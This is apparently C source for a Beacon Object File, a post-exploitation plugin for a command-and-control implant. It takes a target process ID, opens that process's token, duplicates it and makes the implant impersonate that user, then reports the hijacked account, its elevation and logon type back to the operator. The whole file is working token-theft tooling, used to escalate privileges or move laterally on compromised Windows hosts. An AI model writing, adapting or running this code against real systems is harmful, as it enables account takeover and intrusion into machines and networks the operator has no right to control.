#include <windows.h>
#include <ntsecapi.h>
#include "beacon.h"

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcessToken( HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtDuplicateToken( HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle );
WINBASEAPI ULONG    NTAPI NTDLL$RtlNtStatusToDosError( NTSTATUS Status );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtClose(HANDLE Handle);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI HLOCAL  WINAPI KERNEL32$LocalFree (HLOCAL);
WINADVAPI  WINBOOL WINAPI ADVAPI32$GetTokenInformation (HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
WINADVAPI  WINBOOL WINAPI ADVAPI32$LookupAccountSidA (LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
WINBASEAPI NTSTATUS NTAPI SECUR32$LsaGetLogonSessionData(PLUID LogonId,PSECURITY_LOGON_SESSION_DATA *ppLogonSessionData);
WINBASEAPI NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer (PVOID Buffer);

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

//// impersonation
//   NtOpenProcessToken - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE
//   NtDuplicateToken   - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE

//// Create Process
// NtOpenProcessToken - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES | TOKEN_ASSIGN_PRIMARY
// NtDuplicateToken   - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES

BOOL GetLogonTypeFromToken(HANDLE hToken, ULONG* logonType) {
    if (!hToken || !logonType)
        return FALSE;

    TOKEN_STATISTICS stats;
    DWORD size;
    if (!ADVAPI32$GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &size)) {
        return FALSE;
    }

    LUID authId = stats.AuthenticationId;
    PSECURITY_LOGON_SESSION_DATA pSessionData = NULL;

    if (SECUR32$LsaGetLogonSessionData(&authId, &pSessionData) != 0 || pSessionData == NULL) {
        return FALSE;
    }

    *logonType = pSessionData->LogonType;

    SECUR32$LsaFreeReturnBuffer(pSessionData);
    return TRUE;
}


BOOL TokenToUser(HANDLE hToken, CHAR* username, DWORD* usernameSize, CHAR* domain, DWORD* domainSize, BOOL* elevated, DWORD* logonType)
{
    BOOL result = FALSE;
    if (hToken) {
        LPVOID tokenInfo = NULL;
        DWORD  tokenInfoSize = 0;

		result = ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
        if (!result) {
            tokenInfo = KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, tokenInfoSize );
            if (tokenInfo)
                result = ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize);
        }

        TOKEN_ELEVATION Elevation = { 0 };
        DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
        ADVAPI32$GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);

        if (result) {
            SID_NAME_USE SidType;
            result = ADVAPI32$LookupAccountSidA(NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, usernameSize, domain, domainSize, &SidType);
            if (result) {
                *elevated = Elevation.TokenIsElevated;
            }
        }

		GetLogonTypeFromToken(hToken, logonType);

        if (tokenInfo)
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tokenInfo);
    }
    return result;
}

VOID go( IN PCHAR Buffer, IN ULONG Length )
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    DWORD pid = BeaconDataInt(&parser);

    OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };
    CLIENT_ID         Client   = {0};
    HANDLE            hProcess = NULL;

    Client.UniqueProcess = pid;
    NTSTATUS NtStatus = NTDLL$NtOpenProcess( &hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &ObjAttr, &Client );
    if ( NT_SUCCESS(NtStatus) && hProcess) {

        HANDLE hToken = NULL;
        NtStatus = NTDLL$NtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken );
        if ( NT_SUCCESS(NtStatus) && hToken) {

            HANDLE hDupToken = NULL;
            OBJECT_ATTRIBUTES ObjAttr;
            SECURITY_QUALITY_OF_SERVICE Sqos = { sizeof(SECURITY_QUALITY_OF_SERVICE), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
            InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
            ObjAttr.SecurityQualityOfService = &Sqos;

            NTSTATUS Status = NTDLL$NtDuplicateToken( hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &ObjAttr, FALSE, TokenImpersonation, &hDupToken );
            if ( NT_SUCCESS(Status) && hDupToken ) {
                if( BeaconUseToken(hDupToken) ) {
                    BOOL  elevated2     = FALSE;
                    CHAR* username2     = (CHAR*) KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 512 );
                    ULONG usernameSize2 = 512;
                    CHAR* domain2       = (CHAR*) KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 512 );
                    ULONG domainSize2   = 512;
                    ULONG logonType2    = 0;
                    BOOL result = TokenToUser(hToken, username2, &usernameSize2, domain2, &domainSize2, &elevated2, &logonType2);
                    if (result) {
                        if (elevated2)
                            BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully: %s\\%s (logon: %d) [elevated].\n", domain2, username2, logonType2);
                        else
                            BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully: %s\\%s (logon: %d).\n", domain2, username2, logonType2);
                    } else {
                        BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully");
                    }
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, username2);
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain2);
                }
                else {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate user. Error: %d\n", KERNEL32$GetLastError());
                }
            }
            else {
                ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
                BeaconPrintf(CALLBACK_ERROR, "Failed to duplicate token. Error: %d\n", error);
            }
        }
        else {
            ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
            BeaconPrintf(CALLBACK_ERROR, "Failed to open token. Error: %d\n", error);
        }

        if ( hToken ) {
            NTDLL$NtClose(hToken);
            hToken = NULL;
        }
    }
    else {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process. Error: %d\n", error);
    }

    if ( hProcess ) {
        NTDLL$NtClose(hProcess);
        hProcess = NULL;
    }
}